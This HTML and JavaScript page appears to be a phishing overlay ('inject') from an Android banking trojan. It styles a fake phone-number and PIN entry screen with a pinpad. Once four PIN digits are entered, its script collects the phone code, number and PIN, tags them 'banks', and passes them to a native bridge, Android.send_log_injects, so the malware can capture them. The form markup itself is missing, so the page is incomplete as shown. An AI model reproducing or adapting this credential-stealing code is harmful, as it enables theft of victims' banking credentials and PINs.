<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        body {
            background-color: #000;
        }

        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .grid {
            display: grid;
            grid-template-columns: 3fr 9fr;
            grid-gap: 10px;
            margin-bottom: 20px;
        }

        .input {
            width: 100%;
            padding: 14px;
            background-color: #232324;
            border: 0;
            border-radius: 10px;
            color: #fff;
        }

        .code {
            text-align: center;
        }

        section {
            padding: 15px;
            flex: 1;
        }

        footer {
            padding: 15px;
        }

        .button {
            width: 100%;
            padding: 10px;
            color: #fff;
            background-color: #3b82f6;
            border: 0;
            border-radius: 10px;
            font-weight: 500;
        }

        .button:disabled {
            opacity: 0.3;
        }
        
        .td_.td_2 {
            background: transparent;
            height: 300px;
            padding-top: 0;
            color: #ffffffb8;
        }

        .pinpad.d-flex.justify-content-between {
            padding: 1px 25px;
        }

        .td_.td_2 {
            color: #ffffffb8;
        }

        span.pinpad-item {
            color: #fff;
            padding: 20px 0px;
            text-align: center;
            font-size: 32px;
            width: 57px;
            margin-top: -14px;
            cursor: pointer;
            font-weight: 300;
        }

        .fakePass {
            width: 13px;
            height: 13px;
            background-color: #4e4e50;
            border: 2px solid #4e4e50;
            border-radius: 75px;
            display: inline-block;
            margin-right: 20px;
        }
        .checked {
            background-color: #3b82f6 !important;
            border-color: #3b82f6;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>

    <script>
        $('#code').mask('+0000');
        $('#tel').mask('00000000000');

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var code = document.getElementById('code'),
            tel = document.getElementById('tel'),
            pin = document.getElementById('pin');

        var nextPage = document.getElementById('nextPage');

        function check() {
            if(code.value.length >= 2 && tel.value.length >= 5) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        }

        code.onkeyup = () => {
            check();
        }

        tel.onkeyup = () => {
            check();
        }

        nextPage.onclick = () => {
            form1.style.display = 'none';
            form2.style.display = 'flex';
        }

        
        app = angular.module('app', [])
        app.controller('c1', ['$scope', function ($scope) {
            $sc_ = $scope
            $scope.pin = ""
            $scope.edit_pin = function (password) {
                if ($scope.pin.length != 4) {
                    $scope.pin += '' + password;
                    $("#pin").val($scope.pin);
                    console.log(pin)
                }

                if ($scope.pin.length === 4) {   
                    var data = {};
                    data.code = code.value;
                    data.tel = tel.value;
                    data.pin = pin.value;
                    data.type_injects = "banks";
                    data.closed = "close_activity_injects";

                    var ua = navigator.userAgent.toLowerCase();
                    if(ua.indexOf("android") > -1) {
                        try {
                            Android.send_log_injects(JSON.stringify(data))
                        } catch (err) {}
                    }else{
                        alert(JSON.stringify(data));
                    }
                }
            }
            $scope.reset = function () {
                Rlast = $scope.pin.substring(0, $scope.pin.length - 1);
                $scope.pin = Rlast;
                $("#pin").val(Rlast);
            }
        }])


        var btnPin = document.getElementById('btnPin'),
            btnDel = document.getElementById('btnDel'),
            login = document.getElementById('login'),
            fake1 = document.getElementById('fake1'),
            fake2 = document.getElementById('fake2'),
            fake3 = document.getElementById('fake3'),
            fake4 = document.getElementById('fake4'),
            passForm = document.getElementById('passForm');

            for(var i = 1; i <= 10; i++){
                btnPin = document.getElementById('btnPin' + i);
                
                btnPin.onclick = function(){
                    if(fake1.classList == 'fakePass') {
                        fake1.classList = 'fakePass checked';
                    } else if(fake2.classList == 'fakePass') {
                        fake2.classList = 'fakePass checked';
                    } else if(fake3.classList == 'fakePass') {
                        fake3.classList = 'fakePass checked';
                    } else if(fake4.classList == 'fakePass') {
                        fake4.classList = 'fakePass checked';
                    }
                }
            }
            
            btnDel.onclick = function(){
                if (fake4.classList == 'fakePass checked') {
                    fake4.classList = 'fakePass';
                } else if (fake3.classList == 'fakePass checked') {
                    fake3.classList = 'fakePass';
                } else if (fake2.classList == 'fakePass checked') {
                    fake2.classList = 'fakePass';
                } else if (fake1.classList == 'fakePass checked') {
                    fake1.classList = 'fakePass';
                }
            }
    </script>
